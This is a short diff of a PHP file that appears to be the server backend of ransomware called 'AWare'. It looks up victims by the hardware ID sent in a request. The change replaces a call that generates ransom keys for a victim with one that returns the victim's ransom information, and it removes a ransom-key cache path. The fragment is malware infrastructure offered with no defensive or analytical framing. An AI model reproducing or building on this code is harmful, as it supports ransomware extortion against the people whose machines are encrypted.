@@ -4,11 +4,11 @@ require_once 'inc/bootstrap.php';
 
 $AWare = new AWare(new CryptAPI());
 
-$AWare->DefineJsonCachePaths('temp/cache.json', 'temp/ransom_keys_cache.json');
+$AWare->DefineJsonCachePaths('temp/cache.json');
 
 if (isset($_GET['HWID_PC']))
 {
-    $AWare->GenerateVictimRansomKeys($_GET['HWID_PC']);
+    ExitMessage($AWare->GetRansomInformationVictim($_GET['HWID_PC']));
 }
 
 // if (isset($_GET['HWID_PC']))
